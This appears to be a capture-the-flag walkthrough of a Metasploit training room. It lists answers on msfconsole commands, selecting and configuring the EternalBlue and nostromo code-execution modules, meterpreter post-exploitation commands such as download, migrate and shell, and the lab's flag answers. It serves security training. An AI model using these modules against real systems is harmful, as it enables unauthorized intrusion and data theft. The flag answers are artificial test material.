# Intro 
Metasploit is one of the most popular penetration testing frameworks around. It contains a large database of almost every major CVE, which you can easily use against a machine. The aim of this section is to go through some of the major features of metasploit, and at the end there will be a machine that you will need to exploit.
# Setting Up 
Once you have installed metasploit through either the installer or your distributions repos, you will have many new commands available to you. This section will primarily focus on the msfconsole command.

Running that command will present you with an "msf5" prompt which will allow you to enter commands. All tasks can be answered with use of the "help" command.

![meta1](https://user-images.githubusercontent.com/94765997/179359869-6eafe42f-d1f6-4d11-af92-87ce99560231.png)


- [ ] What command allows you to search modules?

		search
- [ ] How do you select a module?    

		use
- [ ] How do you display information about a specific module?

		info
- [ ] How do you list options that you can set?

		options
- [ ] What command lets you view advanced options for a specific module?    

		advanced
- [ ] How do you show options in a specific category

		show
# Selecting a module 
 Once you have found the module for the specific machine that you want to exploit, you need to select it and set the proper options. This task will take you through selecting and setting options for one of the most popular metasploit modules "eternalblue". All basic commands that could be run before selecting a module can also be done while a module is selected.
	
		search eternalblue
		
![meta2](https://user-images.githubusercontent.com/94765997/179359900-7b98c2d4-1774-43ff-80ab-13cc8c5ffcf8.png)


- [ ] How do you select the eternalblue module?

		use exploit/windows/smb/ms17_010_eternalblue
		
![meta3](https://user-images.githubusercontent.com/94765997/179359924-545e1882-418c-4fb6-b042-36431316e811.png)

- [ ] What option allows you to select the target host(s)?

		RHOSTS
- [ ] How do you set the target port?

		RPORT
- [ ] What command allows you to set options?
		set
- [ ] How would you set SMBPass to "username"?
		set SMBPass username
- [ ] How would you set the SMBUser to "password"?

		set SMBUser password
- [ ] What option sets the architecture to be exploited?

		arch
- [ ] What option sets the payload to be sent to the target machine?

		payload
- [ ] Once you've finished setting all the required options, how do you run the exploit?
		
		
		exploit
- [ ] What flag do you set if you want the exploit to run in the background?

		-j
- [ ] How do you list all current sessions?

		sessions
- [ ] What flag allows you to go into interactive mode with a session("drops you either into a meterpreter or regular shell")

		-i
		
![meta4](https://user-images.githubusercontent.com/94765997/179359943-efef653d-1651-4759-8717-783abe08ad53.png)

# meterpreter


Once you've run the exploit, ideally it will give you one of two things, a regular command shell or a meterpreter shell. Meterpreter is metasploits own "control center" where you can do various things to interact with the machine. A list of common meterpreter commands and their uses can be found here


- [ ] What command allows you to download files from the machine?

		download
- [ ] What command allows you to upload files to the machine?

		upload
- [ ] How do you list all running processes?

		ps
- [ ] How do you change processes on the victim host(Ideally it will allow you to change users and gain the perms associated with that user)

		migrate
- [ ] What command lists files in the current directory on the remote machine?
		ls
- [ ] How do you execute a command on the remote host?

		execute
- [ ] What command starts an interactive shell on the remote host?

		shell
- [ ] How do you find files on the target host(Similar function to the linux command "find")

		search
- [ ] How do you get the output of a file on the remote host?

		cat
- [ ] How do you put a meterpreter shell into "background mode"(allows you to run other msf modules while also keeping the meterpreter shell as a session)?

		background
# Final Walkthrough

![meta5](https://user-images.githubusercontent.com/94765997/179359976-e05489f7-1c24-467c-8310-508138b9c947.png)


- [ ] Select the module that needs to be exploited

		use exploit/multi/http/nostromo_code_exec
- [ ] What variable do you need to set, to select the remote host

		RHOSTS
- [ ] How do you set the port to 80

		set RPORT 80
- [ ] How do you set listening address(Your machine)

		LHOST

- [ ] What is the name of the secret directory in the /var/nostromo/htdocs directory?

		s3cretd1r
- [ ] What are the contents of the file inside of the directory?

		Woohoo!
